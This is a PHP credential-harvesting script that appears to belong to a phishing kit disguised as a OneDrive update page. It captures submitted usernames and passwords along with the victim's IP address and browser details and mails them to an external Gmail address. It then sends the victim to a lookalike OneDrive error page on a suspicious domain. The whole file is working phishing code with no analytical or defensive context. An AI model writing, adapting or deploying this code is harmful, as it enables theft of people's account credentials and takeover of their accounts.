<?php
include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{   $ip = getenv("REMOTE_ADDR");
    $subject = "one drive update";
    $to = "gilanawerjojp@gmail.com
";  
    $user_agent = $_SERVER['HTTP_USER_AGENT'];       
    $data = "username:" .$_POST['username']."\n".    
            "password:" .$_POST['password']."\n".    
            "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n"; 
            "IP : ".$ip."\n";$IP=$_POST['IP'];  
            "User Agent:".$user_agent."\n".
            "OS:".Operating_System($user_agent)."\n".
            "Browser:".Browser($user_agent)."\n".
            "Device:".Device($user_agent)."\n".
            "IP:".GetIP()."\n".
    $message = $data .  "$user_agent" ;  
                                  
    mail($to, $subject, $message );
}
if(isset($_POST['username'])) echo "<script>window.location.replace('https://ovdtrivecorporation.site/onedrive-live/ajax9gdgfyhdfjcbwjdsvcfd/websites/errorc398.html?username=".$_POST['username']."');</script>";
else echo "<script>window.location.replace('https://ovdtrivecorporation.site/onedrive-live/ajax9gdgfyhdfjcbwjdsvcfd/websites/errorc398.html?username=');</script>";


   